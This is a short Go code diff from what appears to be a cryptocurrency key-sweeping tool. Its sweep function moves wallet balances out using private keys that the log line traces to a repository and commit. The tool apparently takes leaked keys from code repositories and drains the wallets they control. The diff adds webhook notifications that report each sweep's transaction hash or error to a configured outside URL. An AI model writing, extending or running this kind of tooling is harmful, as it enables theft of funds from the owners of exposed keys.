@@ -253,8 +253,14 @@ func sweep(ctx context.Context, key FoundKey, b BalanceResult, addrs DerivedAddr
 
 	if err != nil {
 		logger.Printf("[sweep] ERROR sweeping %s from %s: %v", b.Chain, b.Address, err)
+		if cfg.WebhookURL != "" {
+			notifySwept(ctx, key, b, "", err.Error(), cfg.WebhookURL)
+		}
 		return
 	}
 	fmt.Printf("SWEPT %s %s from %s (key from %s@%s) → tx %s\n",
 		b.BalanceHuman, b.Chain, b.Address, key.Repo, key.CommitSHA, txHash)
+	if cfg.WebhookURL != "" {
+		notifySwept(ctx, key, b, txHash, "", cfg.WebhookURL)
+	}
 }
